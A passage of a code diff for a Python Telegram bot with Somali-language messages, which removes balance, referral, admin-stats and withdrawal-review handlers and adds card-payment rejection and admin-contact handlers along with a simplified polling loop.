-    uid = call.from_user.id
-    user = users.get(uid)
-    if not user:
-        await call.message.edit_text("❌ User lama helin.")
-        return
-    await call.message.edit_text(f"💰 Balance-kaaga hadda: ${user['balance']:.2f}")
-
-
-@dp.callback_query(F.data == "show_referrals")
-async def inline_show_referrals(call: CallbackQuery):
-    uid = call.from_user.id
-    user = users.get(uid)
-    if not user:
-        await call.message.edit_text("❌ User lama helin.")
-        return
-
-    ref_list = user.get("referrals", [])
-    text = f"👥 Referral Code: {user['ref_code']}\n"
-    text += f"Number of referrals: {len(ref_list)}\n\n"
-    text += "Referred Users:\n"
-    for r in ref_list:
-        text += f"- {r}\n"
-    await call.message.edit_text(text)
-
-
-# ================= INLINE ADMIN NAVIGATION =================
-@dp.callback_query(F.data == "admin_stats")
-async def inline_admin_stats(call: CallbackQuery):
-    if call.from_user.id != ADMIN_ID:
-        return
-
-    total_users = len(users)
-    total_balance = sum(u.get("balance", 0) for u in users.values())
-    total_card_get = sum(1 for u in users.values() if u.get("type") == "card")
-    total_virtual_get = sum(1 for u in users.values() if u.get("type") == "virtual")
-
-    text = (
-        f"📊 Admin Stats\n\n"
-        f"Total Users: {total_users}\n"
-        f"Total Balance: ${total_balance:.2f}\n"
-        f"Total Card Orders: {total_card_get}\n"
-        f"Total Virtual Orders: {total_virtual_get}"
+    await bot.send_message(
+        uid,
+        "❌ Payment lama xaqiijin. Fadlan dib u dir lacagta."
     )
-    await call.message.edit_text(text)
+
+    await call.message.edit_caption("❌ CARD PAYMENT REJECTED")
+    users.pop(uid, None)
 
 
-@dp.callback_query(F.data == "admin_add_balance")
-async def inline_admin_add_balance(call: CallbackQuery):
-    if call.from_user.id != ADMIN_ID:
-        return
-    await call.message.edit_text("📌 Geli Telegram ID-ga user-ka:")
-    await dp.current_state(user=call.from_user.id).set_state(AdminAddBalanceState.waiting_user_id)
+# ================= ADMIN ASK CARD =================
+@dp.callback_query(F.data.startswith("admin_card_ask_"))
+async def admin_card_ask(call: CallbackQuery):
+    uid = int(call.data.split("_")[-1])
 
+    await bot.send_message(
+        uid,
+        "ℹ️ Admin ayaa kula soo xiriiri doona si dalabka loo dhamaystiro."
+    )
 
-@dp.callback_query(F.data == "admin_withdraw_check")
-async def inline_admin_withdraw_check(call: CallbackQuery):
-    if call.from_user.id != ADMIN_ID:
-        return
+    await call.message.edit_caption("⚠️ ADMIN REQUESTED USER")
 
-    if not withdrawals:
-        await call.message.edit_text("❌ Ma jiraan codsiyo withdraw ah.")
-        return
-
-    for req_id, req in withdrawals.items():
-        text = (
-            f"💳 Withdrawal Request\n"
-            f"👤 User: {req['uid']}\n"
-            f"💵 Amount: ${req['amount']:.2f}\n"
-            f"🧾 Request ID: {req_id}\n"
-            f"🏦 {'Number: ' + req['number'] if req['type'] == 'LOCAL' else 'Address: ' + req['address']}\n"
-            f"⏳ Status: {req['status']}"
-        )
-        kb_admin = InlineKeyboardMarkup(inline_keyboard=[
-            [
-                InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_withdraw_confirm_{req_id}"),
-                InlineKeyboardButton(text="REJECT", callback_data=f"admin_withdraw_reject_{req_id}"),
-                InlineKeyboardButton(text="ASK", callback_data=f"admin_withdraw_ask_{req_id}")
-            ]
-        ])
-        await call.message.answer(text, reply_markup=kb_admin)
-
-
-# ================= HELPER FUNCTIONS =================
-def main_user_inline_kb():
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Check Balance", callback_data="check_balance")],
-        [InlineKeyboardButton(text="Referral", callback_data="show_referrals")]
-    ])
-
-
-def main_admin_inline_kb():
-    return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Stats", callback_data="admin_stats")],
-        [InlineKeyboardButton(text="Add Balance", callback_data="admin_add_balance")],
-        [InlineKeyboardButton(text="Withdrawal Check", callback_data="admin_withdraw_check")]
-    ])
-
-
-# ================= MAIN ENTRY POINT =================
+# ================= MAIN =================
 async def main():
-    logging.info("Bot is starting...")
+    await dp.start_polling(bot)
 
-    # Delete webhook if exists to avoid TelegramConflictError
-    await bot.delete_webhook(drop_pending_updates=True)
-
-    try:
-        await dp.start_polling(bot)
-    except Exception as e:
-        logging.error(f"Bot encountered an error: {e}")
-
-
-# ================= RUN BOT =================
 if __name__ == "__main__":
-    import asyncio
     asyncio.run(main())
